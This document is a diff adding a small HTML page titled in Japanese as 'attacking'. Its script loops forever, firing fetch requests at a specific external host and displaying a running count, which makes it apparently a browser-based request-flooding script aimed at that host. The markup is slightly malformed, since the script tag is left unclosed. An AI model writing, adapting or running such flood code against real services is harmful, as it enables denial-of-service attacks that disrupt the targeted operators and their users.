@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title></title>
+</head>
+
+<body>
+  <h1>攻撃中</h1>
+  <h3 id="c"></h3>
+</body>
+<script>
+  let n = 1
+  while (n > 0) {
+    fetch('https://gp-uuc4.iss.netstar-inc.com');
+    document.getElementById('c').innerHTML = n;
+    n++
+  }
+</html>
